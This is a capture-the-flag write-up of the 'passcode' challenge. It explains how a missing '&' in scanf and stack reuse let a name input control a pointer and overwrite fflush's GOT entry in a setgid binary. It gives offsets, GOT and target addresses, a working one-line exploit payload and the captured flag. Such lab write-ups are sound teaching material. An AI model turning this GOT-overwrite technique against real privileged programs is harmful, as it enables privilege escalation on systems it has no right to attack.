## Description

> Mommy! what is a passcode?

This challenge demonstrates how a missing address-of operator in scanf can be abused together with stack reuse to achieve a GOT overwrite without a classic buffer overflow.

---

## Initial Triage

```bash
ls -la
```

```bash
-r--r-----   1 root passcode_pwn    42 Apr 19  2025 flag
-r-xr-sr-x   1 root passcode_pwn 15232 Apr 19  2025 passcode
-rw-r--r--   1 root root           892 Apr 19  2025 passcode.c
```

Key observations:

* Binary is owned by passcode_pwn
* setgid bit is enabled
* flag is not directly readable

This indicates a privilege boundary that must be bypassed.

---

## Binary Characteristics

```bash
file passcode
```

```text
passcode: setgid ELF 32-bit LSB executable, Intel 80386, dynamically linked, not stripped
```

Key points:

* 32-bit ELF
* Not stripped (symbols available)
* setgid binary (privileged execution context)

---

## Code-Level Analysis

```c id="p1"
void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);   // missing &

    fflush(stdin);

    printf("enter passcode2 : ");
    scanf("%d", passcode2);   // missing &

    if(passcode1==123456 && passcode2==13371337){
        setregid(getegid(), getegid());
        system("/bin/cat flag");
    }
}

void welcome(){
    char name[100];
    printf("enter your name : ");
    scanf("%100s", name);
}
```

---

## Key Findings

* scanf("%d", passcode1) is missing &
  scanf treats passcode1 as a memory address
* welcome() writes user input into a stack buffer
* login() reuses the same stack region
* This enables controlled stack state manipulation
* No buffer overflow is required

---

## Vulnerability Analysis

### Bug 1: Missing address operator in scanf

Because `&` is missing, scanf uses the current value of `passcode1` as a memory address and writes to it.

This creates an **arbitrary write primitive**.

---

### Bug 2: Stack reuse between functions

The stack frame used by welcome() is reused by login().

This means:

* data written into name[] can influence passcode1
* passcode1 is not initialized safely before use

---

## Exploit Development

### Step 1: Stack offset

From GDB:

* name[] is at ebp - 0x70
* passcode1 is at ebp - 0x10

Offset:
96 bytes

So the last 4 bytes of input into name control passcode1.

---

### Step 2: Select GOT target

We target fflush because it is called early.

```bash
objdump -R ./passcode
```

```
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

fflush GOT address:
0x0804c014

---

### Step 3: Find control flow target

From disassembly:

```
0x804928f
```

This is the success path leading to flag execution.

Decimal form:
134517391

---

### Step 4: Payload

Payload structure:

* 96 bytes padding
* fflush GOT address
* newline
* 134517391

---

## Exploit

```bash
python3 -c 'import sys; sys.stdout.buffer.write(
b"A"*96 +
b"\x14\xc0\x04\x08" +
b"\n" +
b"134517391\n"
)' | ./passcode
```

---

## Execution Result

```
enter your name : Welcome AAAAA...
enter passcode1 : Login OK!
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
```

---

## Exploit Chain Summary

| Step | Effect                                 |
| ---- | -------------------------------------- |
| 1    | name buffer fills stack via welcome()  |
| 2    | stack reused in login()                |
| 3    | passcode1 becomes controllable pointer |
| 4    | scanf writes to fflush GOT             |
| 5    | execution redirected to success block  |
| 6    | flag printed                           |

---

## Result

```
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
```

---

## Takeaway

This challenge shows that:

* Missing `&` in scanf can create arbitrary write
* Stack reuse can turn input into control of variables
* GOT overwrite enables control flow hijacking
* Exploits can exist without buffer overflows
